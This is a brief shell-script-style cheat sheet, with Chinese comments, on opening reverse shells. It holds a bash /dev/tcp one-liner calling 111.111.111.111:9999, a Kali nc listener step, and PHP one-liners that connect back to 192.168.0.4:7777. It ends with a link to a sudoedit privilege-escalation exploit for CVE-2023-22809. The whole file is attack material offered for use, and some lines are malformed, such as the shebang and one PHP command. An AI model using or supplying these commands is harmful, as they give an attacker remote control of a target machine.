#bin/bash
#利用 nc 等工具反弹 shell 这种方式:
#nc 

 /bin/bash -i >& /dev/tcp/111.111.111.111/9999 0>&1

################
首先在kali上输入：

nc -lvp 7777
然后在目标机上输入：

php- 'exec("/bin/bash -i >& /dev/tcp/192.168.0.4/7777")'
或
php -r '$sock=fsockopen("192.168.0.4",7777);exec("/bin/bash -i 0>&3 1>&3 2>&3");'
################

 sudo.sh
 https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc/blob/main/exploit.sh